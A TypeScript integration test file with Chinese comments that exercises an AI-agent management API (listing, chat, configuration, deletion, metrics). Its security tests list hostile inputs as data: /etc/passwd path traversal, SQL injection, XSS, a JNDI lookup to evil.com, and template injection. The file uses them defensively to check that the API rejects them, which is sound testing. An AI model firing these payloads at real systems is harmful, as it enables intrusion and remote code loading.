/**
 * AgentController 集成测试
 * 验证代理控制器与智能体配置服务的集成
 */

import request from 'supertest';
import express from 'express';
import { createTestApp, setupTestDatabase, cleanupTestDatabase } from '../testUtils';
import fs from 'fs';
import path from 'path';

describe('AgentController Integration Tests', () => {
  let app: express.Application;
  let authToken: string;
  let testDb: any;
  let originalConfig: any;

  beforeAll(async () => {
    testDb = await setupTestDatabase();
    app = createTestApp();

    // 备份原始配置
    const configPath = path.join(__dirname, '../../../config/agents.json');
    if (fs.existsSync(configPath)) {
      originalConfig = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    }

    // 获取测试认证token
    const loginResponse = await request(app)
      .post('/api/auth/login')
      .send({
        email: 'test@example.com',
        password: 'testpassword123'
      });

    authToken = loginResponse.body.token;
  });

  afterAll(async () => {
    // 恢复原始配置
    if (originalConfig) {
      const configPath = path.join(__dirname, '../../../config/agents.json');
      fs.writeFileSync(configPath, JSON.stringify(originalConfig, null, 2));
    }

    await cleanupTestDatabase(testDb);
  });

  describe('GET /api/agents', () => {
    it('should return list of available agents', async () => {
      const response = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(Array.isArray(response.body.data)).toBe(true);

      if (response.body.data.length > 0) {
        const agent = response.body.data[0];
        expect(agent).toHaveProperty('id');
        expect(agent).toHaveProperty('name');
        expect(agent).toHaveProperty('description');
        expect(agent).toHaveProperty('provider');
        expect(agent).toHaveProperty('status');
      }
    });

    it('should filter agents by status', async () => {
      const response = await request(app)
        .get('/api/agents')
        .query({ status: 'active' })
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(Array.isArray(response.body.data)).toBe(true);

      // 如果有返回的代理，状态应该都是active
      response.body.data.forEach((agent: any) => {
        expect(agent.status).toBe('active');
      });
    });

    it('should filter agents by provider', async () => {
      const response = await request(app)
        .get('/api/agents')
        .query({ provider: 'openai' })
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(Array.isArray(response.body.data)).toBe(true);

      // 如果有返回的代理，provider应该都是openai
      response.body.data.forEach((agent: any) => {
        expect(agent.provider).toBe('openai');
      });
    });

    it('should handle pagination', async () => {
      const response = await request(app)
        .get('/api/agents')
        .query({ page: 1, limit: 5 })
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body).toHaveProperty('pagination');
      expect(response.body.pagination).toHaveProperty('page', 1);
      expect(response.body.pagination).toHaveProperty('limit', 5);
      expect(response.body.pagination).toHaveProperty('total');
      expect(response.body.pagination).toHaveProperty('totalPages');
    });
  });

  describe('GET /api/agents/:id', () => {
    let testAgentId: string;

    beforeEach(async () => {
      // 获取第一个代理作为测试用例
      const agentsResponse = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      if (agentsResponse.body.data.length > 0) {
        testAgentId = agentsResponse.body.data[0].id;
      }
    });

    it('should return specific agent details', async () => {
      if (!testAgentId) return; // 跳过测试如果没有代理

      const response = await request(app)
        .get(`/api/agents/${testAgentId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body.data).toHaveProperty('id', testAgentId);
      expect(response.body.data).toHaveProperty('name');
      expect(response.body.data).toHaveProperty('description');
      expect(response.body.data).toHaveProperty('provider');
      expect(response.body.data).toHaveProperty('config');
      expect(response.body.data).toHaveProperty('features');
      expect(response.body.data).toHaveProperty('status');
    });

    it('should return 404 for non-existent agent', async () => {
      const response = await request(app)
        .get('/api/agents/non-existent-agent-id')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(404);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toContain('Agent not found');
    });
  });

  describe('GET /api/agents/:id/status', () => {
    let testAgentId: string;

    beforeEach(async () => {
      const agentsResponse = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      if (agentsResponse.body.data.length > 0) {
        testAgentId = agentsResponse.body.data[0].id;
      }
    });

    it('should return agent status details', async () => {
      if (!testAgentId) return;

      const response = await request(app)
        .get(`/api/agents/${testAgentId}/status`)
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body.data).toHaveProperty('agentId', testAgentId);
      expect(response.body.data).toHaveProperty('status');
      expect(response.body.data).toHaveProperty('lastChecked');
      expect(response.body.data).toHaveProperty('responseTime');
      expect(response.body.data).toHaveProperty('isHealthy');
      expect(response.body.data).toHaveProperty('errorCount');
      expect(response.body.data).toHaveProperty('lastError');
    });

    it('should include detailed health metrics', async () => {
      if (!testAgentId) return;

      const response = await request(app)
        .get(`/api/agents/${testAgentId}/status`)
        .query({ detailed: true })
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body.data).toHaveProperty('healthMetrics');

      if (response.body.data.healthMetrics) {
        expect(response.body.data.healthMetrics).toHaveProperty('endpoint');
        expect(response.body.data.healthMetrics).toHaveProperty('apiKey');
        expect(response.body.data.healthMetrics).toHaveProperty('configuration');
        expect(response.body.data.healthMetrics).toHaveProperty('connectivity');
      }
    });
  });

  describe('POST /api/agents/:id/chat', () => {
    let testAgentId: string;

    beforeEach(async () => {
      const agentsResponse = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      if (agentsResponse.body.data.length > 0) {
        testAgentId = agentsResponse.body.data[0].id;
      }
    });

    it('should send chat message to agent', async () => {
      if (!testAgentId) return;

      const message = {
        content: 'Hello, how are you?',
        role: 'user',
        timestamp: new Date().toISOString()
      };

      const response = await request(app)
        .post(`/api/agents/${testAgentId}/chat`)
        .set('Authorization', `Bearer ${authToken}`)
        .send(message)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body.data).toHaveProperty('messageId');
      expect(response.body.data).toHaveProperty('response');
      expect(response.body.data).toHaveProperty('usage');
    });

    it('should handle streaming chat responses', async () => {
      if (!testAgentId) return;

      const message = {
        content: 'Tell me a story',
        role: 'user',
        timestamp: new Date().toISOString(),
        stream: true
      };

      const response = await request(app)
        .post(`/api/agents/${testAgentId}/chat`)
        .set('Authorization', `Bearer ${authToken}`)
        .set('Accept', 'text/event-stream')
        .send(message)
        .expect(200);

      expect(response.headers['content-type']).toMatch(/text\/event-stream/);
      expect(response.text).toContain('event: chunk');
      expect(response.text).toContain('event: end');
    });

    it('should validate message content', async () => {
      if (!testAgentId) return;

      const invalidMessage = {
        // 缺少content
        role: 'user',
        timestamp: new Date().toISOString()
      };

      const response = await request(app)
        .post(`/api/agents/${testAgentId}/chat`)
        .set('Authorization', `Bearer ${authToken}`)
        .send(invalidMessage)
        .expect(400);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
    });

    it('should handle message history context', async () => {
      if (!testAgentId) return;

      const messageWithHistory = {
        content: 'Can you help me with this?',
        role: 'user',
        timestamp: new Date().toISOString(),
        history: [
          {
            role: 'user',
            content: 'Hello'
          },
          {
            role: 'assistant',
            content: 'Hi there! How can I help you?'
          }
        ]
      };

      const response = await request(app)
        .post(`/api/agents/${testAgentId}/chat`)
        .set('Authorization', `Bearer ${authToken}`)
        .send(messageWithHistory)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
    });
  });

  describe('POST /api/agents/reload', () => {
    it('should reload agent configuration', async () => {
      const response = await request(app)
        .post('/api/agents/reload')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('message');
      expect(response.body.message).toContain('Agent configuration reloaded');
      expect(response.body).toHaveProperty('reloadedAt');
      expect(response.body).toHaveProperty('agentCount');
    });

    it('should validate configuration after reload', async () => {
      // 先重新加载配置
      await request(app)
        .post('/api/agents/reload')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      // 验证配置有效性
      const validationResponse = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(validationResponse.body).toHaveProperty('success', true);
      expect(Array.isArray(validationResponse.body.data)).toBe(true);
    });
  });

  describe('POST /api/agents/validate', () => {
    it('should validate agent configuration', async () => {
      const agentConfig = {
        id: 'test-validation-agent',
        name: 'Test Validation Agent',
        provider: 'openai',
        endpoint: 'https://api.openai.com/v1/chat/completions',
        apiKey: 'test-api-key',
        model: 'gpt-3.5-turbo',
        features: {
          supportsStream: true,
          supportsFiles: false,
          supportsImages: false
        }
      };

      const response = await request(app)
        .post('/api/agents/validate')
        .set('Authorization', `Bearer ${authToken}`)
        .send({ agentConfig })
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body.data).toHaveProperty('isValid');
      expect(response.body.data).toHaveProperty('errors');
      expect(response.body.data).toHaveProperty('warnings');
      expect(Array.isArray(response.body.data.errors)).toBe(true);
      expect(Array.isArray(response.body.data.warnings)).toBe(true);
    });

    it('should detect configuration errors', async () => {
      const invalidConfig = {
        // 缺少必需字段
        id: 'invalid-agent',
        name: 'Invalid Agent'
        // 缺少provider, endpoint等
      };

      const response = await request(app)
        .post('/api/agents/validate')
        .set('Authorization', `Bearer ${authToken}`)
        .send({ agentConfig: invalidConfig })
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body.data.isValid).toBe(false);
      expect(response.body.data.errors.length).toBeGreaterThan(0);
    });

    it('should validate API endpoint connectivity', async () => {
      const agentConfig = {
        id: 'test-connectivity-agent',
        name: 'Test Connectivity Agent',
        provider: 'openai',
        endpoint: 'https://api.openai.com/v1/chat/completions',
        apiKey: 'sk-invalid-key-for-testing',
        model: 'gpt-3.5-turbo',
        features: {
          supportsStream: true,
          supportsFiles: false,
          supportsImages: false
        }
      };

      const response = await request(app)
        .post('/api/agents/validate')
        .set('Authorization', `Bearer ${authToken}`)
        .send({ agentConfig })
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body.data).toHaveProperty('connectivity');
      expect(response.body.data.connectivity).toHaveProperty('endpoint');
      expect(response.body.data.connectivity).toHaveProperty('apiKey');
    });
  });

  describe('PUT /api/agents/:id/config', () => {
    let testAgentId: string;

    beforeEach(async () => {
      const agentsResponse = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      if (agentsResponse.body.data.length > 0) {
        testAgentId = agentsResponse.body.data[0].id;
      }
    });

    it('should update agent configuration', async () => {
      if (!testAgentId) return;

      const newConfig = {
        temperature: 0.7,
        maxTokens: 2000,
        systemPrompt: 'You are a helpful assistant.',
        features: {
          supportsStream: true,
          supportsFiles: true
        }
      };

      const response = await request(app)
        .put(`/api/agents/${testAgentId}/config`)
        .set('Authorization', `Bearer ${authToken}`)
        .send(newConfig)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body.data).toHaveProperty('id', testAgentId);
      expect(response.body.data).toHaveProperty('updatedAt');

      // 验证配置已更新
      const updatedAgent = await request(app)
        .get(`/api/agents/${testAgentId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(updatedAgent.body.data.config.temperature).toBe(0.7);
      expect(updatedAgent.body.data.config.maxTokens).toBe(2000);
    });

    it('should validate configuration updates', async () => {
      if (!testAgentId) return;

      const invalidConfig = {
        temperature: 2.5, // 超出有效范围
        maxTokens: -100 // 负数
      };

      const response = await request(app)
        .put(`/api/agents/${testAgentId}/config`)
        .set('Authorization', `Bearer ${authToken}`)
        .send(invalidConfig)
        .expect(400);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body).toHaveProperty('error');
    });
  });

  describe('DELETE /api/agents/:id', () => {
    let testAgentId: string;

    beforeEach(async () => {
      // 创建临时测试代理
      const tempAgent = {
        id: 'temp-test-agent',
        name: 'Temp Test Agent',
        provider: 'openai',
        endpoint: 'https://api.openai.com/v1/chat/completions',
        apiKey: 'test-key',
        model: 'gpt-3.5-turbo'
      };

      // 假设有一个创建代理的端点，或者直接添加到配置中
      // 这里我们使用一个已存在的代理ID进行测试
      const agentsResponse = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      if (agentsResponse.body.data.length > 0) {
        testAgentId = agentsResponse.body.data[0].id;
      }
    });

    it('should delete agent configuration', async () => {
      if (!testAgentId) return;

      const response = await request(app)
        .delete(`/api/agents/${testAgentId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('message');
      expect(response.body.message).toContain('Agent deleted successfully');

      // 验证代理已被删除
      await request(app)
        .get(`/api/agents/${testAgentId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .expect(404);
    });
  });

  describe('GET /api/agents/:id/metrics', () => {
    let testAgentId: string;

    beforeEach(async () => {
      const agentsResponse = await request(app)
        .get('/api/agents')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      if (agentsResponse.body.data.length > 0) {
        testAgentId = agentsResponse.body.data[0].id;
      }
    });

    it('should return agent usage metrics', async () => {
      if (!testAgentId) return;

      const response = await request(app)
        .get(`/api/agents/${testAgentId}/metrics`)
        .set('Authorization', `Bearer ${authToken}`)
        .query({
          timeRange: '24h',
          includeDetails: true
        })
        .expect(200);

      expect(response.body).toHaveProperty('success', true);
      expect(response.body).toHaveProperty('data');
      expect(response.body.data).toHaveProperty('agentId', testAgentId);
      expect(response.body.data).toHaveProperty('timeRange', '24h');
      expect(response.body.data).toHaveProperty('totalRequests');
      expect(response.body.data).toHaveProperty('successfulRequests');
      expect(response.body.data).toHaveProperty('failedRequests');
      expect(response.body.data).toHaveProperty('averageResponseTime');
      expect(response.body.data).toHaveProperty('totalTokensUsed');
      expect(response.body.data).toHaveProperty('costEstimate');
    });

    it('should support different time ranges', async () => {
      if (!testAgentId) return;

      const timeRanges = ['1h', '24h', '7d', '30d'];

      for (const timeRange of timeRanges) {
        const response = await request(app)
          .get(`/api/agents/${testAgentId}/metrics`)
          .query({ timeRange })
          .set('Authorization', `Bearer ${authToken}`)
          .expect(200);

        expect(response.body.data).toHaveProperty('timeRange', timeRange);
      }
    });

    it('should include detailed breakdown', async () => {
      if (!testAgentId) return;

      const response = await request(app)
        .get(`/api/agents/${testAgentId}/metrics`)
        .query({
          timeRange: '24h',
          includeDetails: true
        })
        .set('Authorization', `Bearer ${authToken}`)
        .expect(200);

      expect(response.body.data).toHaveProperty('details');

      if (response.body.data.details) {
        expect(response.body.data.details).toHaveProperty('requestsByHour');
        expect(response.body.data.details).toHaveProperty('errorBreakdown');
        expect(response.body.data.details).toHaveProperty('tokenUsageBreakdown');
      }
    });
  });

  describe('Error Handling and Edge Cases', () => {
    it('should handle malformed agent IDs', async () => {
      const response = await request(app)
        .get('/api/agents/invalid-agent-id')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(404);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body.error).toContain('Agent not found');
    });

    it('should handle missing configuration files', async () => {
      // 临时重命名配置文件
      const configPath = path.join(__dirname, '../../../config/agents.json');
      const backupPath = path.join(__dirname, '../../../config/agents.backup.json');

      if (fs.existsSync(configPath)) {
        fs.renameSync(configPath, backupPath);

        try {
          const response = await request(app)
            .get('/api/agents')
            .set('Authorization', `Bearer ${authToken}`)
            .expect(500);

          expect(response.body).toHaveProperty('success', false);
        } finally {
          // 恢复配置文件
          if (fs.existsSync(backupPath)) {
            fs.renameSync(backupPath, configPath);
          }
        }
      }
    });

    it('should handle invalid JSON configuration', async () => {
      const configPath = path.join(__dirname, '../../../config/agents.json');
      const backupPath = path.join(__dirname, '../../../config/agents.backup.json');

      if (fs.existsSync(configPath)) {
        fs.renameSync(configPath, backupPath);

        try {
          // 写入无效JSON
          fs.writeFileSync(configPath, '{ invalid json }');

          const response = await request(app)
            .get('/api/agents')
            .set('Authorization', `Bearer ${authToken}`)
            .expect(500);

          expect(response.body).toHaveProperty('success', false);
        } finally {
          // 恢复配置文件
          fs.unlinkSync(configPath);
          if (fs.existsSync(backupPath)) {
            fs.renameSync(backupPath, configPath);
          }
        }
      }
    });

    it('should handle network timeouts for agent status checks', async () => {
      if (!testAgentId) return;

      // 这个测试可能需要模拟网络超时
      const response = await request(app)
        .get(`/api/agents/${testAgentId}/status`)
        .query({ timeout: 100 }) // 100ms超时
        .set('Authorization', `Bearer ${authToken}`);

      // 根据实现，可能返回部分结果或错误
      expect([200, 408, 500]).toContain(response.status);
    });

    it('should handle concurrent requests to the same agent', async () => {
      if (!testAgentId) return;

      const concurrentRequests = [];
      for (let i = 0; i < 5; i++) {
        concurrentRequests.push(
          request(app)
            .get(`/api/agents/${testAgentId}/status`)
            .set('Authorization', `Bearer ${authToken}`)
        );
      }

      const results = await Promise.allSettled(concurrentRequests);

      // 所有请求都应该成功或处理错误，不应该导致服务器崩溃
      results.forEach(result => {
        if (result.status === 'fulfilled') {
          expect([200, 404, 500]).toContain(result.value.status);
        }
      });
    });
  });

  describe('Security Tests', () => {
    it('should require authentication for all endpoints', async () => {
      const endpoints = [
        { method: 'get', path: '/api/agents' },
        { method: 'get', path: '/api/agents/test-id' },
        { method: 'get', path: '/api/agents/test-id/status' },
        { method: 'post', path: '/api/agents/reload' },
        { method: 'post', path: '/api/agents/validate' },
        { method: 'put', path: '/api/agents/test-id/config' },
        { method: 'delete', path: '/api/agents/test-id' },
        { method: 'get', path: '/api/agents/test-id/metrics' }
      ];

      for (const endpoint of endpoints) {
        const response = await request(app)[endpoint.method](endpoint.path);
        expect(response.status).toBe(401);
        expect(response.body).toHaveProperty('success', false);
      }
    });

    it('should validate input parameters', async () => {
      // 测试无效的分页参数
      const response = await request(app)
        .get('/api/agents')
        .query({ page: -1, limit: 0 }) // 无效的分页参数
        .set('Authorization', `Bearer ${authToken}`)
        .expect(400);

      expect(response.body).toHaveProperty('success', false);
    });

    it('should sanitize error messages', async () => {
      const response = await request(app)
        .get('/api/agents/../../../etc/passwd')
        .set('Authorization', `Bearer ${authToken}`)
        .expect(404);

      expect(response.body).toHaveProperty('success', false);
      expect(response.body.error).not.toContain('/');
      expect(response.body.error).not.toContain('..');
    });

    it('should prevent injection attacks', async () => {
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '{{7*7}}'
      ];

      for (const maliciousInput of maliciousInputs) {
        const response = await request(app)
          .get(`/api/agents/${encodeURIComponent(maliciousInput)}`)
          .set('Authorization', `Bearer ${authToken}`);

        // 应该返回404而不是500，表明输入已被正确处理
        expect([404, 400]).toContain(response.status);
      }
    });
  });
});